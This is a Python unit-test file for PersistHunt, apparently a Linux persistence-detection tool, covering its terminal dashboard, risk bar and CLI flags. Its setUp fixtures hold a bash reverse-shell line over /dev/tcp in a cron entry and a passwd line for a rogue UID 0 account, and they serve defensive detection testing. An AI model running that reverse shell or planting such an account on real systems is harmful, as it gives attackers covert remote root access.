import io
import unittest
from unittest.mock import patch, MagicMock
from persisthunt.findings import Finding, FindingCollection, Severity
from persisthunt.reporting import generate_report
from persisthunt.tui import (
    render_tui_dashboard,
    format_risk_bar,
    should_use_color,
    launch_interactive_tui,
)
from persisthunt.cli import main, EXIT_SUCCESS, EXIT_THREAT_DETECTED


class TestTUI(unittest.TestCase):
    def setUp(self):
        self.findings = FindingCollection()
        self.findings.add(Finding(
            id="PH-CRON-001",
            category="cron",
            severity=Severity.HIGH,
            title="Interactive network reverse shell in crontab",
            description="Crontab references /dev/tcp socket redirection.",
            evidence="/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            location="/etc/cron.d/backdoor:2",
            recommendation="Terminate unauthorized cron entries immediately."
        ))
        self.findings.add(Finding(
            id="PH-ACCT-001",
            category="account",
            severity=Severity.CRITICAL,
            title="Non-root account with UID 0",
            description="Unauthorized user has UID 0 assigned.",
            evidence="toor:x:0:0::/root:/bin/bash",
            location="/etc/passwd:toor",
            recommendation="Remove unauthorized UID 0 account."
        ))

    def test_render_tui_dashboard_with_findings(self):
        report = generate_report(self.findings, host="audit-host-01")
        output = render_tui_dashboard(report, use_color=False, show_findings=True)

        self.assertIn("PERSISTHUNT", output)
        self.assertIn("audit-host-01", output)
        self.assertIn("PH-CRON-001", output)
        self.assertIn("PH-ACCT-001", output)
        self.assertIn("THREAT LEVEL METER:", output)
        self.assertIn("PERSISTENCE VECTOR TELEMETRY MATRIX:", output)
        self.assertIn("CRITICAL:", output)
        self.assertIn("HIGH:", output)
        self.assertIn("Terminate unauthorized cron entries immediately.", output)

    def test_render_tui_dashboard_clean_scan(self):
        empty_collection = FindingCollection()
        report = generate_report(empty_collection, host="clean-host")
        output = render_tui_dashboard(report, use_color=False, show_findings=True)

        self.assertIn("CLEAN SCAN", output)
        self.assertIn("0.0/10.0", output)

    def test_format_risk_bar_levels(self):
        # Critical
        bar_crit = format_risk_bar(9.0, 10.0, use_color=False)
        self.assertIn("CRITICAL THREAT", bar_crit)
        self.assertIn("9.0/10.0", bar_crit)

        # High
        bar_high = format_risk_bar(6.0, 10.0, use_color=False)
        self.assertIn("HIGH RISK", bar_high)

        # Clean
        bar_clean = format_risk_bar(0.0, 10.0, use_color=False)
        self.assertIn("SECURE / CLEAN", bar_clean)

    def test_should_use_color_respects_no_color_env(self):
        with patch.dict("os.environ", {"NO_COLOR": "1"}):
            self.assertFalse(should_use_color())

        with patch.dict("os.environ", {"TERM": "dumb"}, clear=True):
            self.assertFalse(should_use_color())

        # Explicit override
        self.assertTrue(should_use_color(force_color=True))
        self.assertFalse(should_use_color(force_color=False))

    def test_scan_report_to_tui_method(self):
        report = generate_report(self.findings)
        tui_str = report.to_tui(use_color=False)
        self.assertIn("PERSISTHUNT", tui_str)
        self.assertIn("PH-CRON-001", tui_str)

    @patch("persisthunt.tui.launch_interactive_tui", return_value=0)
    def test_cli_tui_subcommand(self, mock_tui):
        with patch("sys.stdout", new=io.StringIO()), \
             patch("sys.stderr", new=io.StringIO()):
            code = main(["tui", "-c", "cron", "--exit-zero", "--quiet"])
            self.assertEqual(code, EXIT_SUCCESS)
            mock_tui.assert_called_once()

    @patch("persisthunt.tui.launch_interactive_tui", return_value=0)
    def test_cli_scan_with_tui_flag(self, mock_tui):
        with patch("sys.stdout", new=io.StringIO()), \
             patch("sys.stderr", new=io.StringIO()):
            code = main(["scan", "--tui", "-c", "cron", "--exit-zero", "--quiet"])
            self.assertEqual(code, EXIT_SUCCESS)
            mock_tui.assert_called_once()

    def test_cli_scan_plain_flag(self):
        with patch("sys.stdout", new=io.StringIO()) as out, \
             patch("sys.stderr", new=io.StringIO()):
            code = main(["scan", "-c", "cron", "--plain", "--exit-zero", "--quiet"])
            self.assertEqual(code, EXIT_SUCCESS)
            val = out.getvalue()
            # Plain output contains the classic header lines
            self.assertIn("PersistHunt\nLinux Persistence Detection Framework", val)

    def test_launch_interactive_tui_fallback_when_curses_fails(self):
        report = generate_report(self.findings)
        with patch("curses.wrapper", side_effect=Exception("Terminal error")), \
             patch("sys.stdout", new=io.StringIO()) as out:
            ret = launch_interactive_tui(report)
            self.assertEqual(ret, 0)
            self.assertIn("PERSISTHUNT", out.getvalue())


if __name__ == "__main__":
    unittest.main()
